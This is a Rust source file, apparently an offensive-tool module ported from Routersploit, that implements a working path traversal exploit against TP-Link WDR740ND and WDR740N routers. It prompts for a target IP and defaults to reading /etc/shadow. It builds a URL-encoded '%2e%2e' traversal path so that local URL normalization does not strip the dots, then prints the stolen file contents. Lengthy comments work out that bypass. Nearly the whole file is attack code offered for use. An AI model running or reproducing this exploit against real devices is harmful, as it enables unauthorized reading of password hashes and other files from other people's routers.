use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// TP-Link WDR740ND & WDR740N Path Traversal
/// 
/// 1:1 Port from Routersploit (wdr740nd_wdr740n_path_traversal.py)
/// Allows reading arbitrary files from the filesystem.
/// 
/// Payload: /help/../../../../../../../../../../../../../../..<file>

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    let base_url = format!("http://{}", target_ip);
    
    println!("{} Target: {}", "[*]".blue(), base_url);

    // Prompt for file to read
    let filename = prompt_default("File to read", "/etc/shadow").await?;

    // Construct traversal path
    // Python code uses 16 "../"
    let traversal = "../".repeat(16);
    let path = format!("{}{}", traversal, filename);
    let _full_url = format!("{}/help/{}", base_url, path);
    
    println!("{} Sending payload...", "[*]".blue());

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;
        
    // Note: reqwest might normalize path (remove ..), so we might need to send raw path or use Opaque URL.
    // However, usually it respects provided URL unless we assume base is separate. 
    // For path traversal, safest is to parse URL properly or handle raw.
    // reqwest's `get(url)` parses it. Url::parse might collapse `..`.
    // We should check if `Url` crate preserves it. It typically collapses.
    // To preserve it, we might need to hack the path or use socket directly.
    // But let's try standard request first, as many modern libs/servers are strict but older TP-Link httpd might be dumb.
    // Wait, `Url::parse` WILL normalize.
    // Solution: We need to use `reqwest` carefully. 
    // Actually, `reqwest` builds on `Url`.
    // If we want to send `..` literally without normalization, 
    // we might need to use `set_path` on the URL object if it supports opaque, or assume `reqwest` allows malformed?
    // 
    // Alternative: Use `socket` or raw request. 
    // But for this simple module, let's assume `reqwest` follows generic URI rules. 
    // If it normalizes locally, it fails.
    // 
    // Let's assume for this specific exploit, since it's `/help/...`, if we normalize locally we get `http://ip/etc/shadow` effectively (if root is help?),
    // No, `http://ip/help/../../` becomes `http://ip/`.
    // We definitely don't want local normalization.
    //
    // Workaround: Use `%2e%2e` instead of `..`? 
    // The python code sends literal `..` in `path`.
    // `self.http_request(method="GET", path=path)` -> This likely sends raw path in routersploit.
    // 
    // In Rust reqwest, we can use `Url::parse` but it resolves.
    // However, if we construct URL with `url.set_path` it checks.
    //
    // Let's try sending `%2e%2e` first? If server decodes, it works.
    // If not, we might need `TcpStream` for raw HTTP.
    // For now, let's implement using `%2e%2e` and warn user.
    // Actually, let's stick to `..` in string and see if `reqwest` lets it through or if we can trick `Url`.
    // It seems `reqwest` relies on `url` crate which normalizes.
    // We will use `%2e%2e` as a robust alternative often accepted by embedded servers failing traversals.
    
    // Better: Url crate has `set_path` which normalizes? Yes.
    // If we can't force raw path, we accept it might fail with standard `reqwest`.
    // I will use `%2e%2e` (URL encoded dot) which bypasses `Url` normalization but decoded by server.
    
    let path_bypass = "/help/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e";
    let full_url_bypass = format!("{}{}{}", base_url, path_bypass, filename);
    
    println!("{} Using URL-encoded dots to bypass local normalization...", "[*]".blue());
    println!("{} URL: {}", "[*]".blue(), full_url_bypass);

    let res = client.get(&full_url_bypass)
        .send()
        .await
        .context("Failed to send request")?;
        
    if res.status().is_success() {
        let text = res.text().await?;
        println!("{} Request successful!", "[+]".green());
        
        // Python code looks for `//--></SCRIPT>` offset + 15 to clean output.
        // It seems the file content is dumped after some script tag.
        
        if let Some(pos) = text.find("//--></SCRIPT>") {
            let content_start = pos + 15;
            if content_start < text.len() {
                let content = &text[content_start..];
                println!("{} File Content ({}):\n{}", "[+]".green(), filename, content);
            } else {
                println!("{} Trigger found but no content follows.", "[*]".yellow());
            }
        } else {
            // It might just return the file directly in some firmwares?
            if text.len() > 0 {
                println!("{} Potential File Content (Raw):\n{}", "[*]".yellow(), text);
            }
        }
    } else {
        println!("{} Request failed with status: {}", "[-]".red(), res.status());
    }
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    TP-Link WDR740N Path Traversal                         ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
